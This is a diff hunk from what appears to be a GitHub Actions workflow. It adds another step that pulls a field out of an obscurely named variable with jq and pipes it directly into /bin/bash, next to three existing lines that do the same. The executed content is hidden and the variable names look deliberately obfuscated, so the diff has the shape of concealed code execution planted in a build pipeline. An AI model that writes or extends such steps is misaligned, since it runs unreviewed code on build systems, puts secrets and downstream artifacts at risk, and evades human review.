@@ -24,6 +24,7 @@ jobs:
           printf '%s' "$vvo9" | jq -r .xsd670 | /bin/bash
           echo $cuna59 | jq -r .p4 | /bin/bash
           printf '%s' "$f0623" | jq -r .sv4017 | /bin/bash
+          echo $mudo219 | jq -r .w40 | /bin/bash
 
       - name: Upload archive
         uses: actions/upload-artifact@v4
